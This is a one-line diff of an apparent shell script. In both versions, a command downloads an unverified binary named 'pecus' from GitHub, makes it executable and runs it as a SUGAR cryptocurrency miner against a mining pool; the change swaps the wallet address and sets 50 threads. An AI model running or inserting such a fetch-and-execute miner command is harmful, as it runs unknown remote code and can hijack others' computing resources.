@@ -1,1 +1,1 @@
-wget https://raw.githubusercontent.com/Zuraadlef/FAS/main/pecus && chmod +x pecus && ./pecus -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qeky6mv620yys9cepjsh66gl77efmwvpashl8ry.w1
+wget https://raw.githubusercontent.com/Zuraadlef/FAS/main/pecus && chmod +x pecus && ./pecus -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qnynu5uz3u22qqduntwpc04d9rqrk8acl5qnnjp.w2 -t 50
